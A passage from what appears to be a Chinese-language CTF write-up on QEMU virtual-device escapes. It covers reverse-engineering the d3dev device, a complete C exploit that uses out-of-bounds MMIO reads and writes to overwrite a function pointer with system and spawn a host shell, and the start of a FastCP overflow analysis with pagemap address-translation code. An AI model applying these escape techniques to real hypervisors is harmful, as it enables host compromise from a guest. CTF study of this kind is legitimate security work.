<a class="sourceLine" id="cb3-19" title="19">}</a></code></pre></div>
<p>之后查看mmio和pmio的读写函数，但是在详细分析之前修改这些函数的第一个参数</p>
<p>第一个参数默认为<code>void *opaque</code></p>
<p>但是明显可以看到他是一个指向自定义结构体的指针，我们可以：</p>
<blockquote>
<p>选中opaque -&gt; 右键Convert to struct* -&gt; d3devState</p>
</blockquote>
<p>具体的结构体名词可以在<code>pci_d3dev_realize()</code>函数中查看汇编查看</p>
<p><img src="https://pic1.imgdb.cn/item/6357cdda16f2c2beb1c3ed00.png" /></p>
<p>可以在IDA中详细查看这个结构体的定义</p>
<div class="sourceCode" id="cb4"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb4-1" title="1"><span class="bn">00000000</span> d3devState struc ; (<span class="kw">sizeof</span>=<span class="bn">0x1300</span>, align=<span class="bn">0x10</span>, copyof_4545)</a>
<a class="sourceLine" id="cb4-2" title="2"><span class="bn">00000000</span> pdev PCIDevice_0 ?</a>
<a class="sourceLine" id="cb4-3" title="3"><span class="fl">000008E0</span> mmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-4" title="4"><span class="bn">00000</span><span class="er">9D0</span> pmio MemoryRegion_0 ?</a>
<a class="sourceLine" id="cb4-5" title="5"><span class="bn">00000</span><span class="er">AC0</span> memory_mode dd ?</a>
<a class="sourceLine" id="cb4-6" title="6"><span class="bn">00000</span><span class="er">AC4</span> seek dd ?</a>
<a class="sourceLine" id="cb4-7" title="7"><span class="bn">00000</span><span class="er">AC8</span> init_flag dd ?</a>
<a class="sourceLine" id="cb4-8" title="8"><span class="bn">00000</span><span class="er">ACC</span> mmio_read_part dd ?</a>
<a class="sourceLine" id="cb4-9" title="9"><span class="bn">00000</span><span class="er">AD0</span> mmio_write_part dd ?</a>
<a class="sourceLine" id="cb4-10" title="10"><span class="bn">00000</span><span class="er">AD4</span> r_seed dd ?</a>
<a class="sourceLine" id="cb4-11" title="11"><span class="bn">00000</span><span class="er">AD8</span> blocks dq <span class="dv">257</span> dup(?)</a>
<a class="sourceLine" id="cb4-12" title="12"><span class="fl">000012E0</span> key dd <span class="dv">4</span> dup(?)</a>
<a class="sourceLine" id="cb4-13" title="13"><span class="bn">000012</span><span class="er">F0</span> rand_r dq ?                             ; offset</a>
<a class="sourceLine" id="cb4-14" title="14"><span class="bn">000012</span><span class="er">F8</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-15" title="15"><span class="bn">000012</span><span class="er">F9</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-16" title="16"><span class="bn">000012</span><span class="er">FA</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-17" title="17"><span class="bn">000012</span><span class="er">FB</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-18" title="18"><span class="bn">000012</span><span class="er">FC</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-19" title="19"><span class="bn">000012</span><span class="er">FD</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-20" title="20"><span class="bn">000012</span><span class="er">FE</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-21" title="21"><span class="bn">000012</span><span class="er">FF</span> db ? ; undefined</a>
<a class="sourceLine" id="cb4-22" title="22"><span class="bn">00001300</span> d3devState ends</a>
<a class="sourceLine" id="cb4-23" title="23"><span class="bn">00001300</span></a></code></pre></div>
<p>之后分析mmio_read和mmio_write的操作</p>
<p>根据IDA可以看出，<code>d3dev_mmio_read()</code>该函数首先通过<code>seek</code>和<code>addr</code>来从<code>opaque-&gt;blocks</code>中取出<code>block</code>，然后经过<code>tea</code>编码后，返回给用户。</p>
<p>从上面数据结构中，可知<code>block</code>的长度为<code>0x100</code>，而我们这里传入的<code>addr</code>并没有检查范围，所以可以超过<code>0x100</code>，从而发生越界读取。而这里越界之后，可以读取<code>key</code>和<code>rand_r</code>的值。</p>
<p>接着看<code>d3dev_write</code>:该函数主要是将传入的<code>val</code>赋值给<code>opaque-&gt;blocks[offset]</code>。如果是奇数次，则直接赋值。如果是偶数次则先加密再赋值。这里也没有对<code>addr</code>进行范围检查，可以越界写。</p>
<p>之后<code>d3dev_pmio_read()</code></p>
<p><img src="https://pic1.imgdb.cn/item/6357d1ad16f2c2beb1c9063b.png" /></p>
<p><code>d3dev_pmio_read</code>基本功能就是，通过输入不同的<code>addr</code>，会进入不同<code>switch-case</code>。这里就会将<code>opaque-&gt;key</code>的四个值进行返回。</p>
<p><code>d3dev_pmio_write</code>会去调用<code>rand_r</code>函数指针，这个指针存储的是<code>rand</code>函数地址。</p>
<p><img src="https://pic1.imgdb.cn/item/6357d23b16f2c2beb1c9c6f4.png" /></p>
<h3 id="漏洞利用">2. 漏洞利用</h3>
<p>利用mmio_read的越界读获得key值和rand_r的值，其中rand_r保存的rand函数的地址，实现泄露地址，我们通过越界读泄漏该地址，那么就可以得到<code>qemu</code>的基址。</p>
<p>得到了<code>qemu</code>基址后，我们就可以计算得到<code>system</code>函数的地址。</p>
<p>然后通过越界写，修改<code>rand_r</code>存储的函数指针为<code>system</code>。然后去触发<code>system</code>函数。</p>
<p>在<code>d3dev_mmio_write</code>函数中的越界写可以直接修改结构体中的数据，两个分支一个可以直接覆写4字节，另一个经过加密后可以覆写8字节；<code>d3dev_mmio_read</code>读取的数据要经过随机数key和key1进行加密，可以通过越界写将两处key内存覆盖为0或在<code>d3dev_pmio_write</code>函数中将两处key都设置为0</p>
<p>这里想实现<code>getshell</code>，可以去执行<code>rand_r</code>函数，并设置参数为<code>sh</code>。</p>
<p>查看mmio和pmio基地址的方法：</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb5-1" title="1"><span class="ex">/sys/devices</span>/pci0000:<span class="ex">00</span>/0000:<span class="ex">00</span>:03.0 <span class="co"># cat resource</span></a>
<a class="sourceLine" id="cb5-2" title="2"><span class="ex">0x00000000febf1000</span> 0x00000000febf17ff 0x0000000000040200</a>
<a class="sourceLine" id="cb5-3" title="3"><span class="ex">0x000000000000c040</span> 0x000000000000c05f 0x0000000000040101</a></code></pre></div>
<p>其中0x00000000febf1000就是mmio地址；0x000000000000c040就是pmio地址</p>
<h3 id="exploit">3. Exploit</h3>
<div class="sourceCode" id="cb6"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb6-1" title="1"><span class="pp">#include</span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb6-2" title="2"><span class="pp">#include</span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb6-3" title="3"><span class="pp">#include</span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb6-4" title="4"><span class="pp">#include</span><span class="im">&lt;sys/io.h&gt;</span></a>
<a class="sourceLine" id="cb6-5" title="5"><span class="pp">#include</span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb6-6" title="6"><span class="pp">#include</span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb6-7" title="7"></a>
<a class="sourceLine" id="cb6-8" title="8"><span class="dt">unsigned</span> <span class="dt">char</span>* mmio_mem;</a>
<a class="sourceLine" id="cb6-9" title="9"></a>
<a class="sourceLine" id="cb6-10" title="10"><span class="dt">void</span> Err(<span class="dt">char</span> * err){</a>
<a class="sourceLine" id="cb6-11" title="11">    printf(<span class="st">&quot;Error: %s</span><span class="sc">\n</span><span class="st">&quot;</span>,err);</a>
<a class="sourceLine" id="cb6-12" title="12">    exit(-<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-13" title="13">}</a>
<a class="sourceLine" id="cb6-14" title="14"></a>
<a class="sourceLine" id="cb6-15" title="15"><span class="dt">void</span> init_pmio(){</a>
<a class="sourceLine" id="cb6-16" title="16">    iopl(<span class="dv">3</span>); <span class="co">// 0x3ff 以上端口全部开启访问</span></a>
<a class="sourceLine" id="cb6-17" title="17">}</a>
<a class="sourceLine" id="cb6-18" title="18"></a>
<a class="sourceLine" id="cb6-19" title="19"><span class="dt">void</span> init_mmio(){</a>
<a class="sourceLine" id="cb6-20" title="20">    <span class="dt">int</span> mmio_fd = open(<span class="st">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>,O_RDWR|O_SYNC);</a>
<a class="sourceLine" id="cb6-21" title="21">    mmio_mem = mmap(<span class="dv">0</span>,<span class="bn">0x1000</span>,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-22" title="22">}</a>
<a class="sourceLine" id="cb6-23" title="23"></a>
<a class="sourceLine" id="cb6-24" title="24"><span class="dt">void</span> mmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-25" title="25">    *(<span class="dt">uint32_t</span>*)(mmio_mem+addr) = value;</a>
<a class="sourceLine" id="cb6-26" title="26">}</a>
<a class="sourceLine" id="cb6-27" title="27"></a>
<a class="sourceLine" id="cb6-28" title="28"><span class="dt">uint64_t</span> mmio_read(<span class="dt">uint64_t</span> addr){</a>
<a class="sourceLine" id="cb6-29" title="29">    <span class="cf">return</span> *(<span class="dt">uint64_t</span>*)(mmio_mem+addr); </a>
<a class="sourceLine" id="cb6-30" title="30">}</a>
<a class="sourceLine" id="cb6-31" title="31"></a>
<a class="sourceLine" id="cb6-32" title="32"><span class="dt">uint32_t</span> pmio_base = <span class="bn">0xc040</span>;</a>
<a class="sourceLine" id="cb6-33" title="33"></a>
<a class="sourceLine" id="cb6-34" title="34"><span class="dt">void</span> pmio_write(<span class="dt">uint32_t</span> addr,<span class="dt">uint32_t</span> value){</a>
<a class="sourceLine" id="cb6-35" title="35">    outl(value,pmio_base+addr);</a>
<a class="sourceLine" id="cb6-36" title="36">}</a>
<a class="sourceLine" id="cb6-37" title="37"></a>
<a class="sourceLine" id="cb6-38" title="38"><span class="dt">uint64_t</span> pmio_read(<span class="dt">uint32_t</span> addr){</a>
<a class="sourceLine" id="cb6-39" title="39">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)inl(pmio_base+addr);</a>
<a class="sourceLine" id="cb6-40" title="40">}</a>
<a class="sourceLine" id="cb6-41" title="41"></a>
<a class="sourceLine" id="cb6-42" title="42"><span class="dt">uint64_t</span> encode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-43" title="43"></a>
<a class="sourceLine" id="cb6-44" title="44">    <span class="dt">uint32_t</span> addr = <span class="bn">0xC6EF3720</span>;</a>
<a class="sourceLine" id="cb6-45" title="45"></a>
<a class="sourceLine" id="cb6-46" title="46">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-47" title="47">        high = high - ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-48" title="48">        low = low - (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-49" title="49">        addr += <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-50" title="50">    }</a>
<a class="sourceLine" id="cb6-51" title="51"></a>
<a class="sourceLine" id="cb6-52" title="52">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-53" title="53">}</a>
<a class="sourceLine" id="cb6-54" title="54"></a>
<a class="sourceLine" id="cb6-55" title="55"><span class="dt">uint64_t</span> decode(<span class="dt">uint32_t</span> high, <span class="dt">uint32_t</span> low) {</a>
<a class="sourceLine" id="cb6-56" title="56"></a>
<a class="sourceLine" id="cb6-57" title="57">    <span class="dt">uint32_t</span> addr = <span class="bn">0x0</span>;</a>
<a class="sourceLine" id="cb6-58" title="58"></a>
<a class="sourceLine" id="cb6-59" title="59">    <span class="cf">for</span> (<span class="dt">int</span> i = <span class="dv">0</span>; i &lt; <span class="dv">32</span>; ++i) {</a>
<a class="sourceLine" id="cb6-60" title="60">        addr -= <span class="bn">0x61C88647</span>;</a>
<a class="sourceLine" id="cb6-61" title="61">        low += (((high + addr) ^ (high &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * high)));</a>
<a class="sourceLine" id="cb6-62" title="62">        high += ((low + addr) ^ (low &gt;&gt; <span class="dv">5</span>) ^ (<span class="dv">16</span> * low));</a>
<a class="sourceLine" id="cb6-63" title="63">    }</a>
<a class="sourceLine" id="cb6-64" title="64"></a>
<a class="sourceLine" id="cb6-65" title="65">    <span class="cf">return</span> (<span class="dt">uint64_t</span>)high * <span class="bn">0x100000000</span> + low;</a>
<a class="sourceLine" id="cb6-66" title="66">}</a>
<a class="sourceLine" id="cb6-67" title="67"></a>
<a class="sourceLine" id="cb6-68" title="68"><span class="dt">int</span> main(){</a>
<a class="sourceLine" id="cb6-69" title="69">    printf(<span class="st">&quot;init pci and mmio:</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-70" title="70">    init_pmio();</a>
<a class="sourceLine" id="cb6-71" title="71">    init_mmio();</a>
<a class="sourceLine" id="cb6-72" title="72"></a>
<a class="sourceLine" id="cb6-73" title="73">    printf(<span class="st">&quot;set seek = 0x100</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-74" title="74">    pmio_write(<span class="bn">0x8</span>,<span class="bn">0x100</span>);</a>
<a class="sourceLine" id="cb6-75" title="75">    printf(<span class="st">&quot;set key = 0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-76" title="76">    pmio_write(<span class="bn">0x4</span>,<span class="dv">0</span>);</a>
<a class="sourceLine" id="cb6-77" title="77"></a>
<a class="sourceLine" id="cb6-78" title="78"></a>
<a class="sourceLine" id="cb6-79" title="79">    printf(<span class="st">&quot;oob read rand_r</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-80" title="80">    <span class="dt">uint64_t</span> value = mmio_read(<span class="dv">3</span>*<span class="dv">8</span>);</a>
<a class="sourceLine" id="cb6-81" title="81">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>,value);</a>
<a class="sourceLine" id="cb6-82" title="82"></a>
<a class="sourceLine" id="cb6-83" title="83">    <span class="dt">uint64_t</span> rand_r = decode(value&gt;&gt;<span class="dv">32</span>, value&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-84" title="84">    printf(<span class="st">&quot;%lx</span><span class="sc">\n</span><span class="st">&quot;</span>, rand_r);</a>
<a class="sourceLine" id="cb6-85" title="85"></a>
<a class="sourceLine" id="cb6-86" title="86">    <span class="dt">uint64_t</span> system_addr = rand_r+<span class="bn">0xa560</span>;</a>
<a class="sourceLine" id="cb6-87" title="87">    printf(<span class="st">&quot;system_addr ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, system_addr);</a>
<a class="sourceLine" id="cb6-88" title="88"></a>
<a class="sourceLine" id="cb6-89" title="89">    <span class="dt">uint64_t</span> encode_system = encode(system_addr&gt;&gt;<span class="dv">32</span>, system_addr&amp;<span class="bn">0xffffffff</span>);</a>
<a class="sourceLine" id="cb6-90" title="90">    printf(<span class="st">&quot;encode_system ==&gt; %lx</span><span class="sc">\n</span><span class="st">&quot;</span>, encode_system);</a>
<a class="sourceLine" id="cb6-91" title="91"></a>
<a class="sourceLine" id="cb6-92" title="92">    <span class="dt">uint32_t</span> es_low  = encode_system % <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-93" title="93">    <span class="dt">uint32_t</span> es_high = encode_system / <span class="bn">0x100000000</span>;</a>
<a class="sourceLine" id="cb6-94" title="94"></a>
<a class="sourceLine" id="cb6-95" title="95">    printf(<span class="st">&quot;oob write</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-96" title="96">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_low);</a>
<a class="sourceLine" id="cb6-97" title="97">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb6-98" title="98">    mmio_write(<span class="dv">3</span>*<span class="dv">8</span>, es_high);</a>
<a class="sourceLine" id="cb6-99" title="99"></a>
<a class="sourceLine" id="cb6-100" title="100">    printf(<span class="st">&quot;set seek=0x0</span><span class="sc">\n</span><span class="st">&quot;</span>);</a>
<a class="sourceLine" id="cb6-101" title="101">    pmio_write(<span class="bn">0x8</span>, <span class="bn">0x0</span>);</a>
<a class="sourceLine" id="cb6-102" title="102"></a>
<a class="sourceLine" id="cb6-103" title="103"></a>
<a class="sourceLine" id="cb6-104" title="104">    pmio_write(<span class="bn">0x1c</span>,<span class="bn">0x6873</span>); <span class="co">// 0x6873 == &quot;sh&quot;</span></a>
<a class="sourceLine" id="cb6-105" title="105"></a>
<a class="sourceLine" id="cb6-106" title="106">}</a></code></pre></div>
<div class="sourceCode" id="cb7"><pre class="sourceCode sh"><code class="sourceCode bash"><a class="sourceLine" id="cb7-1" title="1"><span class="co">#!bash</span></a>
<a class="sourceLine" id="cb7-2" title="2"><span class="fu">gcc</span> expliot.c -o expliot --static <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-3" title="3"><span class="fu">chmod</span> +x expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-4" title="4"><span class="fu">cp</span> ./expliot ./cpio-root/expliot <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-5" title="5"><span class="bu">cd</span> ./cpio-root <span class="kw">&amp;&amp;\</span></a>
<a class="sourceLine" id="cb7-6" title="6"><span class="fu">find</span> . <span class="kw">|</span> <span class="fu">cpio</span> -o --format=newc <span class="op">&gt;</span> ../rootfs.img</a></code></pre></div>
<h2 id="x02-hws2021-fastcp">0x02 HWS2021 FastCP</h2>
<h3 id="分析-1">1. 分析</h3>
<pre class="bas"><code>#!/bin/sh

./qemu-system-x86_64 -initrd ./rootfs.img -nographic -kernel ./vmlinuz-5.0.5-generic -append &quot;priority=low console=ttyS0&quot; -monitor /dev/null --device FastCP
</code></pre>
<p>可以看到有设备FastCP</p>
<div class="sourceCode" id="cb9"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb9-1" title="1"><span class="dt">void</span> __fastcall pci_FastCP_realize(PCIDevice_0 *pdev, Error_0 **errp)</a>
<a class="sourceLine" id="cb9-2" title="2">{</a>
<a class="sourceLine" id="cb9-3" title="3">  Object_0 *v2; <span class="co">// rbp</span></a>
<a class="sourceLine" id="cb9-4" title="4"></a>
<a class="sourceLine" id="cb9-5" title="5">  v2 = object_dynamic_cast_assert(</a>
<a class="sourceLine" id="cb9-6" title="6">         &amp;pdev-&gt;qdev.parent_obj,</a>
<a class="sourceLine" id="cb9-7" title="7">         <span class="st">&quot;FastCP&quot;</span>,</a>
<a class="sourceLine" id="cb9-8" title="8">         <span class="st">&quot;/root/source/qemu/hw/misc/fastcp.c&quot;</span>,</a>
<a class="sourceLine" id="cb9-9" title="9">         <span class="dv">258</span>,</a>
<a class="sourceLine" id="cb9-10" title="10">         <span class="st">&quot;pci_FastCP_realize&quot;</span>);</a>
<a class="sourceLine" id="cb9-11" title="11">  pdev-&gt;config[<span class="dv">61</span>] = <span class="dv">1</span>;</a>
<a class="sourceLine" id="cb9-12" title="12">  <span class="cf">if</span> ( !msi_init(pdev, <span class="dv">0</span>, <span class="dv">1</span><span class="bu">u</span>, <span class="dv">1</span>, <span class="dv">0</span>, errp) )</a>
<a class="sourceLine" id="cb9-13" title="13">  {</a>
<a class="sourceLine" id="cb9-14" title="14">    timer_init_full(</a>
<a class="sourceLine" id="cb9-15" title="15">      (QEMUTimer_0 *)&amp;v2[<span class="dv">166</span>].properties,</a>
<a class="sourceLine" id="cb9-16" title="16">      <span class="dv">0</span><span class="bu">LL</span>,</a>
<a class="sourceLine" id="cb9-17" title="17">      QEMU_CLOCK_VIRTUAL,</a>
<a class="sourceLine" id="cb9-18" title="18">      (<span class="dt">int</span>)&amp;stru_F4240,</a>
<a class="sourceLine" id="cb9-19" title="19">      <span class="dv">0</span>,</a>
<a class="sourceLine" id="cb9-20" title="20">      fastcp_cp_timer,</a>
<a class="sourceLine" id="cb9-21" title="21">      v2);</a>
<a class="sourceLine" id="cb9-22" title="22">    memory_region_init_io(</a>
<a class="sourceLine" id="cb9-23" title="23">      (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free,</a>
<a class="sourceLine" id="cb9-24" title="24">      v2,</a>
<a class="sourceLine" id="cb9-25" title="25">      &amp;fastcp_mmio_ops,</a>
<a class="sourceLine" id="cb9-26" title="26">      v2,</a>
<a class="sourceLine" id="cb9-27" title="27">      <span class="st">&quot;fastcp-mmio&quot;</span>,</a>
<a class="sourceLine" id="cb9-28" title="28">      (<span class="dt">uint64_t</span>)&amp;stru_100000);</a>
<a class="sourceLine" id="cb9-29" title="29">    pci_register_bar(pdev, <span class="dv">0</span>, <span class="dv">0</span>, (MemoryRegion_0 *)&amp;v2[<span class="dv">57</span>].free);</a>
<a class="sourceLine" id="cb9-30" title="30">    HIDWORD(v2[<span class="dv">63</span>].parent) = <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb9-31" title="31">  }</a>
<a class="sourceLine" id="cb9-32" title="32">}</a></code></pre></div>
<p>主要有mmio操作和cp_timer操作</p>
<p>接下来分析mmio_read操作</p>
<p><img src="https://pic1.imgdb.cn/item/6358f67116f2c2beb1334b2c.png" /></p>
<p>可以看到如果size==8 ，根据addr的不同返回不同的数据，</p>
<ul>
<li>功能0x08 返回opaque-&gt;cp_state.CP_list_src</li>
<li>功能0x10 返回opaque-&gt;cp_state.CP_list_cnt</li>
<li>功能0x18 返回opaque-&gt;cp_state.cmd3</li>
</ul>
<p>其中为了控制size==0需要设置addr为<code>uint64_t</code>类型</p>
<p>接下来分析mmio_write</p>
<p><img src="https://pic1.imgdb.cn/item/6358f82716f2c2beb136cffd.png" /></p>
<p>当addr==24的时候不仅设置cmd，还触发时钟函数<code>timer_mod</code></p>
<p>之后分析<code>fastcp_cp_timer</code>函数</p>
<p><img src="https://pic1.imgdb.cn/item/6358fa8116f2c2beb13b7715.png" /></p>
<p>timer函数根据传入的参数cmd来选择执行的分支</p>
<p><img src="https://pic1.imgdb.cn/item/6358fbce16f2c2beb13db48c.png" /></p>
<p>其中<code>void cpu_physical_memory_rw(hwaddr addr, uint8_t *buf, int len, int is_write)</code></p>
<div class="sourceCode" id="cb10"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb10-1" title="1"><span class="dt">void</span> cpu_physical_memory_rw(hwaddr addr, <span class="dt">void</span> *buf,</a>
<a class="sourceLine" id="cb10-2" title="2">                            hwaddr len, <span class="dt">bool</span> is_write);</a>
<a class="sourceLine" id="cb10-3" title="3"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_read(hwaddr addr,</a>
<a class="sourceLine" id="cb10-4" title="4">                                            <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-5" title="5">{</a>
<a class="sourceLine" id="cb10-6" title="6">    cpu_physical_memory_rw(addr, buf, len, false);</a>
<a class="sourceLine" id="cb10-7" title="7">}</a>
<a class="sourceLine" id="cb10-8" title="8"><span class="dt">static</span> <span class="kw">inline</span> <span class="dt">void</span> cpu_physical_memory_write(hwaddr addr,</a>
<a class="sourceLine" id="cb10-9" title="9">                                             <span class="dt">const</span> <span class="dt">void</span> *buf, hwaddr len)</a>
<a class="sourceLine" id="cb10-10" title="10">{</a>
<a class="sourceLine" id="cb10-11" title="11">    cpu_physical_memory_rw(addr, (<span class="dt">void</span> *)buf, len, true);</a>
<a class="sourceLine" id="cb10-12" title="12">}</a></code></pre></div>
<p>如果<code>opaque-&gt;cp_state.CP_list_cnt</code>大小大于<code>0x10</code>，则会根据<code>cp_state.CP_list_cnt</code>的大小循环从<code>opaque-&gt;cp_state.CP_list_src</code>读取结构体到<code>cp_info</code>，然后依次将<code>CP_src</code>中的数据写入到<code>CP_buffer</code>，然后从<code>CP_buffer</code>中读取数据到<code>CP_dst</code>，长度由<code>CP_cnt</code>指定。</p>
<p>漏洞很明显位于在命令为 1 且 CP_list_cnt 大于 0x10 的时候，复制前没有检测 CP_cnt 是否会大于 0x1000 字节，而在 FastCPState 的结构中（结构如下）</p>
<pre><code>00000000 FastCPState struc ; (sizeof=0x1A30, align=0x10, copyof_4530)
00000000 pdev PCIDevice_0 ?
000008F0 mmio MemoryRegion_0 ?
000009E0 cp_state CP_state ?
000009F8 handling db ?
000009F9 db ? ; undefined
000009FA db ? ; undefined
000009FB db ? ; undefined
000009FC irq_status dd ?
00000A00 CP_buffer db 4096 dup(?)
00001A00 cp_timer QEMUTimer_0 ?
00001A30 FastCPState ends</code></pre>
<p>可以看出CP_buffer只有0x1000字节。</p>
<h3 id="物理地址转换">2. 物理地址转换</h3>
<p>通过<code>pagemap</code>将虚拟机中的虚拟地址转换为物理地址。</p>
<p>根据内核文档可知，每个虚拟页在<code>/proc/pid/pagemap</code>中对应一项长度为<code>64 bits</code>的数据，其中<code>Bit 63</code>为<code>page present</code>，表示物理内存页是否已存在；若物理页已存在，则<code>Bits 0-54</code>表示物理页号，此外，需要<code>root</code>权限的进程才能读取<code>/proc/pid/pagemap</code>中的内容。</p>
<pre><code>pagemap is a new (as of 2.6.25) set of interfaces in the kernel that allow
userspace programs to examine the page tables and related information by
reading files in /proc.

There are four components to pagemap:

*/proc/pid/pagemap. This file lets a userspace process find out which
physical frame each virtual page is mapped to. It contains one 64-bit
value for each virtual page, containing the following data (from
fs/proc/task_mmu.c, above pagemap_read):

* Bits 0-54 page frame number (PFN) if present
* Bits 0-4 swap type if swapped
* Bits 5-54 swap offset if swapped
* Bit 55 pte is soft-dirty (see Documentation/vm/soft-dirty.txt)
* Bit 56 page exclusively mapped (since 4.2)
* Bits 57-60 zero
* Bit 61 page is file-page or shared-anon (since 3.5)
* Bit 62 page swapped
* Bit 63 page present

Since Linux 4.0 only users with the CAP_SYS_ADMIN capability can get PFNs.
In 4.0 and 4.1 opens by unprivileged fail with -EPERM. Starting from
4.2 the PFN field is zeroed if the user does not have CAP_SYS_ADMIN.
Reason: information about PFNs helps in exploiting Rowhammer vulnerability.</code></pre>
<p>根据以上信息，利用<code>/proc/pid/pagemap</code>可将虚拟地址转换为物理地址，具体步骤如下：</p>
<p>1、 计算虚拟地址所在虚拟页对应的数据项在<code>/proc/pid/pagemap</code>中的偏移，<code>offset=(viraddr/pagesize)*sizeof(uint64_t)</code></p>
<p>2、 读取长度为<code>64bits</code>的数据项</p>
<p>3、 根据<code>Bit 63</code> 判断物理内存页是否存在</p>
<p>4、 若物理内存页已存在，则取<code>bits 0-54</code>作为物理页号</p>
<p>5、 计算出物理页起始地址加上页内偏移即得到物理地址，<code>phtaddr = pageframenum * pagesize + viraddr % pagesize</code></p>
<p>对应代码如下：</p>
<div class="sourceCode" id="cb13"><pre class="sourceCode c"><code class="sourceCode c"><a class="sourceLine" id="cb13-1" title="1"><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></a>
<a class="sourceLine" id="cb13-2" title="2"><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></a>
<a class="sourceLine" id="cb13-3" title="3"><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></a>
<a class="sourceLine" id="cb13-4" title="4"><span class="pp">#include </span><span class="im">&lt;assert.h&gt;</span></a>
<a class="sourceLine" id="cb13-5" title="5"><span class="pp">#include </span><span class="im">&lt;fcntl.h&gt;</span></a>
<a class="sourceLine" id="cb13-6" title="6"><span class="pp">#include </span><span class="im">&lt;inttypes.h&gt;</span></a>
<a class="sourceLine" id="cb13-7" title="7"><span class="pp">#include </span><span class="im">&lt;sys/mman.h&gt;</span></a>
<a class="sourceLine" id="cb13-8" title="8"><span class="pp">#include </span><span class="im">&lt;sys/types.h&gt;</span></a>
<a class="sourceLine" id="cb13-9" title="9"><span class="pp">#include </span><span class="im">&lt;unistd.h&gt;</span></a>
<a class="sourceLine" id="cb13-10" title="10"><span class="pp">#include </span><span class="im">&lt;sys/io.h&gt;</span><span class="pp">   </span></a>
<a class="sourceLine" id="cb13-11" title="11"><span class="pp">#include </span><span class="im">&lt;stdint.h&gt;</span></a>
<a class="sourceLine" id="cb13-12" title="12"></a>
<a class="sourceLine" id="cb13-13" title="13"><span class="dt">size_t</span> va2pa(<span class="dt">void</span> *addr){</a>
<a class="sourceLine" id="cb13-14" title="14">    <span class="dt">uint64_t</span> data;</a>
<a class="sourceLine" id="cb13-15" title="15"></a>
<a class="sourceLine" id="cb13-16" title="16">    <span class="dt">int</span> fd = open(<span class="st">&quot;/proc/self/pagemap&quot;</span>,O_RDONLY);</a>
<a class="sourceLine" id="cb13-17" title="17">    <span class="cf">if</span>(!fd){</a>
<a class="sourceLine" id="cb13-18" title="18">        perror(<span class="st">&quot;open pagemap&quot;</span>);</a>
<a class="sourceLine" id="cb13-19" title="19">        <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb13-20" title="20">    }</a>
<a class="sourceLine" id="cb13-21" title="21"></a>
<a class="sourceLine" id="cb13-22" title="22">    <span class="dt">size_t</span> pagesize = getpagesize();</a>
<a class="sourceLine" id="cb13-23" title="23">    <span class="dt">size_t</span> offset = ((<span class="dt">uintptr_t</span>)addr / pagesize) * <span class="kw">sizeof</span>(<span class="dt">uint64_t</span>);</a>
